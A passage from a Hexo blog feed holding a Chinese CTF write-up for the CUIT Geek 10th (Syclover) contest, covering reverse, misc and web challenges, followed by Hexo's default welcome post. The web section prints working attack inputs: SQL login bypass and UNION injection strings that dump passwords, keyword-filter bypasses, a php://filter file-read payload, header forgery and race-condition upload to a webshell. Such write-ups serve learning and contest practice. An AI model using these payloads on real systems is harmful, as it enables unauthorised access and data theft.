        <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><ul><li>jiang’s fan 密码都记错？你个假粉丝！！  </li></ul><blockquote><p>思路:鉴于是逆向的签到题,故这道题把下载下来的hello.exe扔进IDA里面,搜索Syc  </p></blockquote><p><img src="https://i.loli.net/2020/02/11/JgtVr9W4kU3dljP.png" alt></p><h1 id="Misc杂项"><a href="#Misc杂项" class="headerlink" title="Misc杂项"></a>Misc杂项</h1><ol><li>签到题</li></ol><blockquote><p>微信扫描关注Syclover的公众号,输入flag[嘿嘿嘿,暑假就关注了哟,之前一直都看不懂师傅们发的文章,现在虽然还是看不懂,但是有那么一点点点的东西能看懂了!</p></blockquote><a id="more"></a><p><img src="https://i.loli.net/2020/02/11/DhXCTmt1Fk7YAxe.png" alt></p><ol start="2"><li>啊啊啊啊啊啊啊！！！我好兴奋！！！  </li></ol><blockquote><p>下载下来在010editor打开,然后搜索字符串</p></blockquote><p><img src="https://i.loli.net/2020/02/11/DH2M9GtExd4nK8v.png" alt></p><ol start="3"><li>翻过这座山:翻过这座山，他们就会听到你的故事 </li></ol><blockquote><p>这个题目的目的是告诉我们搭梯子的重要性,进入题目网址然后进入师傅的github,找到最近才修改过的内容,然后出现了假flag,然后在flag,md里面有个隐藏的文件夹</p></blockquote><p><img src="https://i.loli.net/2020/02/11/hcySGMkO3gDewPb.png" alt></p><p><img src="https://i.loli.net/2020/02/11/PN7SG1D3WomcgeI.png" alt></p><ol start="4"><li>散打黑客的压缩包: 我拼着生命危险从散打黑客的电脑里偷来的压缩包，大家快跟我一起破解开。看看藏着什么东西。 </li></ol><blockquote><p>压缩包密码爆破</p></blockquote><p><img src="https://i.loli.net/2020/02/11/wzv8LuyPQ2S3tfA.png" alt="爆破出打开压缩文件的口令"></p><p><img src="https://i.loli.net/2020/02/11/WuLA8i67TNgKPza.png" alt="爆破出第二个口令"></p><ol start="5"><li>是谁杀了谁:注意自己的HP，别被气死了。 </li></ol><blockquote><p>安全狗就要把显示隐藏文件打开</p></blockquote><p><img src="https://i.loli.net/2020/02/11/RljOtgfmzcd2UTE.png" alt></p><blockquote><p>然后用记事本打开或者以html文件打开.</p></blockquote><p><img src="https://i.loli.net/2020/02/11/F5e7ruazSqULfiQ.png" alt></p><ol start="6"><li><p>RPG真是太有趣了吧:做题也太累了,不如来打会游戏吧. </p><p>这是我做的最后一个misc…..要玩游戏还的要配置文件哈哈,</p><p><img src="https://i.loli.net/2020/02/11/1GkBCmieV42aKDw.png" alt></p></li></ol><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>   <em>先说说总的体验吧….我太菜了!然后就是我把极客的题型总结了一下,没有做出来了以后就好好学然后自己再去找题做了</em></p><blockquote><p>下面是自己的体验,正确与否无从知晓</p></blockquote><p>   1.右键看源码</p><p>   2.菜刀连接webshell</p><p>   3.Brupsuite 的extender模块 也就是告诉我们新生可以自定义插件的模块</p><p>   4.文件上传漏洞之条件竞争</p><p>   5.万能登录密码 sql注入之1=1恒成立</p><p>   6.RCE me (没有做出来),题目的目的就是GET一个code,然后有什么phpinfo界面</p><p>   7.代码审计之php curl功能 听说要用vps (做不来)</p><p>   8.Ssrf&amp;&amp;crlf(没有学,学了点基础概念,知道有这么个东西..也没有去做)</p><p>   9.Sql注入正常级别,就是有点套路</p><p>   10.Weak php &amp;&amp;xxe(没有做正在学)</p><p>   11.代码审计题2,文件上传 要求图片大小符合要求(感觉有点难,毕竟500分)</p><p>   12.Sql注入之关键字过滤</p><p>   13.XXF 和referer +[浏览器]伪造</p><p>   14.命令执行(没做)</p><p>   15.文件包含漏洞(利用了php伪协议php://filter,把flag.php通过base64编码显示出来)</p><p>   16.报错注入,进过一些了fuzz测试,发现过滤了空格 = * union 然后不管怎么绕都好像不行我是five</p><p>   17.文件上传,加了图片头GIF89a,以及尝试过传图片马,但是把传上去的图片地址访问后,仍然说不是图片,用蚁剑也连不上,我尝试过用蚁剑生成的webshell去也连不上,一句话木马也不行,我是five</p><p>   18.存储型XSS,得到了cookie但是不知道怎么利用,因为这个cookie又不是admin 的.(XSS也没怎么学)</p><p>   19.反序列化0x1 因为是public,使用自己上脚本得到序列化的值GET过去0x2 因为是private所以要用%00类名%00参数,具体见博客</p><p>   20.利用URL编码[对字符串的,先进行16进制转码然后再加%],刚开始本以为会利用md5()函数的漏洞特性,还是自己的代码审计时候没有那种嗅觉,感觉看到md5就开始冲想要用0e绕过,数组绕过………还是多从逻辑考虑</p><p>   21.最后一个sql注入,我猜应该就是那些基于时间的注入或者其他比较难的吧.[做不来]</p><p>   22.最后一个题 也是XXE.我是five</p><hr><ol><li>打比赛前先撸一只猫！: 猫猫陪我打ctf！ </li></ol><blockquote><p>Web签到题,直接看源码?哈哈,是一个假flag…</p><p>原理:GET传参</p></blockquote><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb1.png" alt="web1"></p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb11.png" alt="web11"></p><ol start="2"><li>你看见过我的菜刀么 </li></ol><blockquote><p>打开页面,发现一句话木马,知道是webshell题,果断蚁剑启动!</p></blockquote><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb22.png" alt="web22"></p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb2.png" alt="web2"></p><ol start="3"><li><p>BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧 </p><blockquote><p>将下载好的.jar文件在brupsuite中的extender模块中添加.然后可根据指引得到flag</p></blockquote></li></ol><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb3.png" alt="web3"></p><ol start="4"><li>性感潇文清，在线算卦：动作快点才能算到好卦。 </li></ol><blockquote><p>文件上传之条件竞争</p><p> <strong>条件竞争漏洞</strong>是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。 </p><p>攻击者通过不断地发起访问上传的恶意文件请求的方法成功的将原有处理不安全文件</p><pre><code>上传文件E→删除不安全文件E</code></pre><p>的业务逻辑变成了</p><pre class=" language-php+HTML"><code class="language-php+HTML">上传文件E→访问执行文件E，生成shell文件S→删除不安全文件E</code></pre></blockquote><p><strong>思路:</strong>抓包,通过Intruder发起两次快速访问(如何快速?设置payload为空,并且线程设置要大</p><blockquote><p>通过brupsuite不断的访问两个页面,一个是算卦那个页面,一个是返回的uploads/路径</p></blockquote><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb4.png" alt="web4"></p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb444.png" alt="web444"></p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb4444.png" alt="web4444"></p><blockquote><p>payload设置的位置选择为不影响结果的User-Agent</p></blockquote><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cwebs.png" alt="webs"></p><ol start="5"><li>Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！ </li></ol><blockquote><h3 id="一般的-有登录界面的-查询界面的-考虑sql注入-摘自我的博客总结的"><a href="#一般的-有登录界面的-查询界面的-考虑sql注入-摘自我的博客总结的" class="headerlink" title="一般的,有登录界面的,查询界面的,考虑sql注入(摘自我的博客总结的)"></a>一般的,有登录界面的,查询界面的,考虑sql注入(<a href="http://www.d0g1.cn/2019/10/22/sql%e6%b3%a8%e5%85%a5%e5%90%88%e9%9b%86%e6%8c%81%e7%bb%ad%e6%9b%b4%e6%96%b0/" target="_blank" rel="noopener">摘自我的博客总结的</a>)</h3><blockquote><p>sql注入的<strong>流程</strong>:</p><p>1.判断是否存在注入.</p><p>常用方法,使用单引号’来引起SQL语句报错,这也是最基本的基于报错的注入.更多的方法在书上,我也就不copy了</p><p>2.用order by 1,2,3…#(或者%23)来查询列数,注意语句结束一定要使用注释符#或者经过URL编码的%23,因为使用了才能使查询语句闭合,不报错,返回想要的东西</p><p>3.在范围内进行联合查询 union select …,也就是爆库名,爆表名,爆字段,最终的flag</p></blockquote></blockquote><blockquote><p>sql注入之万能登录密码;</p><p>or 是一个逻辑运算符,作用是在判断两个条件的时候,只要其中一个条件成立,那么</p><p> 等式将会成立 or ‘1’=’1 返回为真</p></blockquote><pre><code>payload:username:&#39; or 1=1#password:随便输入</code></pre><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Csql1.png" alt="sql1"></p><ol start="6"><li><p>Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！ </p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Csql2%5C1.png" alt="1"></p><p>先用 order by 4查询是否有4列,结果为</p></li></ol><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Csql2%5C2.png" alt="2"></p><p>用order by 3#时,提示我们用户名和密码错误,因此可以判断有3列<img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Csql2%5C4.png" alt="4"></p><p>用union注入语句: -1’union select 1,2,3#</p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Csql2%5C5.png" alt="5"></p><p>发现只有2,3,然后继续查询数据库名称</p><p>-1’union select 1,user(),database()#</p><p>得到数据库为geek</p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Csql2%5C6.png" alt="6"></p><p>有了数据库名称,就可以继续查表了</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span>select <span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Csql2%5C7.png" alt="7"></p><p>显然, l0ve1ysq1 是我们想要的</p><blockquote><p>-1’ union select 1,group_concat(password),3 from l0ve1ysq1#</p></blockquote><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Csql2%5C10.png" alt="10"></p><ol start="7"><li>Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！ </li></ol><blockquote><p>sql语句中的关键字过滤绕过,我采用的是双写绕过的方法</p></blockquote><blockquote><p> 先使用1′ or 1=1,发现or被过滤了…..然后发现select from information 这些关键字都被过滤了,于是采用双写关键字的方式来绕过,seleselectct,frorom,infoorrmation,oorr </p><p>其他步骤不再重复展示了</p></blockquote><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Csql3%5C%E5%87%BA%E7%8E%B0%E4%BA%86-768x520.png" alt="出现了-768x520"></p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Csql3%5C%E6%9C%80%E7%BB%88%E5%BE%97%E5%88%B0flag-768x263.png" alt="最终得到flag-768x263"></p><ol start="8"><li><p>神秘的三叶草:柳暗花明</p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb5.png" alt="web5"></p><p><strong>一般的,如果页面没有什么功能,只是单纯的文字展示或者什么的,直接看源码中的xxx.php或者有无其他注释</strong></p><p>打开后,发现It doesn’t come from ‘<a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a></p><p>于是这就很亲切了,改Referer以及XFF头伪造,但是这道题还伪造了浏览器</p><p>抓包就好了</p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb55.png" alt="web55"></p></li></ol><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cweb555.png" alt="web555"></p><ol start="9"><li><p>神秘的三叶草</p><blockquote><p>知识点:文件包含漏洞</p><blockquote><p><strong>文件包含漏洞:通过PHP函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</strong></p></blockquote></blockquote><p><img src="/posts/20191130/C:%5CUsers%5C32028%5CDesktop%5Csyc%5C%E6%8A%93%E5%8C%85.png" alt="抓包"></p><p>提示没看清,现在我看到这种类型的,都直接抓包分析了….</p><p><img src="/posts/20191130/C:%5CUsers%5C32028%5CDesktop%5Csyc%5C%E6%89%BE%E5%88%B0%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6.png" alt="找到目标文件"></p></li></ol><p>   <img src="/posts/20191130/C:%5CUsers%5C32028%5CDesktop%5Csyc%5C3%E4%B8%AA%E8%A6%81%E7%82%B9.png" alt="3个要点"></p><blockquote><p>1.GET一个参数file</p><p>2.过滤掉../(用于绕过),tp,data</p><p>3.include()函数包含了file(正是因为这个函数的存在,告诉了我是文件包含)</p></blockquote><p>   POC: ?file=php://filter/read=convert.base64-encode/resource=flag.php 这里涉及一个知识点</p><p>   php伪协议: PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 </p><pre><code>****php://filter是我们常常使用的一个伪协议，在任意文件读取，甚至getshell的时候都有利用的机会。****在include函数的使用上，经常会造成任意文件读取漏洞**file_get_contents()和file_put_contents()这样函数下，常常会构成getshell等更严重的漏洞。**https://blog.csdn.net/qq_33904831/article/details/78814567 </code></pre><p>   得到base64编码的flag.php的内容</p><p>   PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ1N5Y3tKaWFuZ18xdVl1YW5fTm9fSX0nOwogICAgICAgICAgICAgICAgJHNlY3JldCA9ICdqaUFuZ19MdXl1YW5fdzRudHNfYV9nMXJJZnJpM25kJwogICAgICAgICAgICA/PgogICAgICAgIDwvcD4KICAgIDwvYm9keT4KCjwvaHRtbD4K </p><p>   解码后</p><pre class=" language-html"><code class="language-html">   <span class="token doctype">&lt;!DOCTYPE html></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>FLAG<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">background-color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-family</span><span class="token punctuation">:</span>verdana<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>啊哈！你找到我了！可是你看不到我QAQ~~~<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">20</span>px<span class="token punctuation">;</span><span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>               <span class="token prolog">&lt;?php                   echo "我就在这里";                   $flag = 'Syc{Jiang_1uYuan_No_I}';                   $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'               ?></span>           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><ol start="10"><li>反序列化1.0 : socre10000拿到flag [简单,直接写脚本把序列化后的内容传过去就行]</li></ol><p><img src="/posts/20191130/C:%5CUsers%5C32028%5CDesktop%5Csyc%5C%E6%93%A6%E4%B8%80%E4%B8%AA%E5%8D%95%E8%AF%8D.png" alt="擦一个单词"></p><ol start="11"><li>又来一只猫:我家猫名字叫php</li></ol><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cf1.png" alt="f1"></p><p>敏感词汇:网站备份,于是扫描一下目录</p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cf2.png" alt="f2"></p><p>发现了<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a>  我没扫目录之前直接输入的是index.php.bak[因为之前做过类似的题]</p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cf3.png" alt="f3"></p><p>因为是private类型的成员变量故需要加上%00,而第一个反序列化是public,所以可以直接用,还有一种protected型的,就需要加\x00*</p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Cf6.png" alt="f6"></p><p>直接上脚本</p><p><img src="/posts/20191130/C:%5CUsers%5C32028%5CDesktop%5Csyc%5C%E8%84%9A%E6%9C%AC.png" alt="脚本"></p><p><img src="/posts/20191130/C:%5CUsers%5C32028%5CDesktop%5Csyc%5C%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83.png" alt="编码规范"></p><p><a href="http://www.d0g1.cn/2019/11/03/%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/" target="_blank" rel="noopener">更多的反序列笔记总结在了博客里面</a></p><ol start="12"><li>你有初恋吗：你变心了吗 </li></ol><p>拿到了,我就冲冲冲,以为就是常规利用md5()函数的漏洞特性来做……想了想,试了试好像实现不了…?我太菜了!</p><p><img src="/posts/20191130/C:%5CUsers%5C32028%5CDesktop%5Csyc%5CQQ%E5%9B%BE%E7%89%8720191107221313.png" alt="QQ图片20191107221313"></p><p>于是整理了一下思路,发现只需要对Syclover进行urlencode就行了!!!</p><p><img src="/posts/20191130/E:%5CWp%E5%9B%BE%E7%89%87%5Clover.png" alt="lover"></p><p>Lastly,虽然有很多题我都没有做出来,但都有过尝试.如文件上传那道题,我试过上传图片马,用JS代码包含php代码,文件头GIF89a,文件后缀这些都试了,还甚至试过文件名的sql注入..我也不知道为什么这400分我就是拿不到….还有李三的代码审计第一题,明白了是一个什么样的逻辑不知道怎么去实现,XSS我得到了cookie,但是这个cookie好像并没有什么用,还是我自己不会利用….hardsql报错注入我也试了试,得到了许多返回信息,比如and = * union被过滤或者禁用了之类的….也看了很多帖子,学习了很多,但感觉学的东西都还是比较浅显的,一遇到难的就会卡…我也没有怎么肝题…..明年一定,明年一定</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CUIT Geek 10th </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/20190820/"/>
      <url>/posts/20190820/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
